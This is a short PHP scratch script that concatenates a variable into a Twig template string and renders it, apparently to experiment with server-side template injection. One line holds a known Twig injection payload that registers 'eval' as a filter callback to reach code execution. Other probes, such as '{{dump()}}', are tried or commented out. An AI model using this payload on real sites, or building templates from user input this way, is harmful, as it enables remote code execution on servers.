<?php
    require_once 'vendor/autoload.php';

    $name = "";
    $name ='{{_self.env.registerUndefinedFilterCallback("eval")}}{{_self.env.getFilter("idx")}}';
    $name = "{{dump()}}";
    #$name = '{{ include(template_from_string("Hello {{ name }}")) }}';
    #$name = "{{}}";
    $t = '___ '.$name.' ___';
                    
                    
    $loader = new Twig_Loader_Array(array('index' => $t,));
    $twig = new Twig_Environment($loader, array(
        'debug' => true,));


    $twig->addExtension(new Twig_Extension_Debug());


 #   $loader.getCacheKey($t->get_class());
  #  print_r( get_class_methods($loader));
    #echo $twig));
    #echo $loader;
    #var_dump(get_class($t));

    echo $twig->render('index', array('name' => 'Fabiena'));
?>





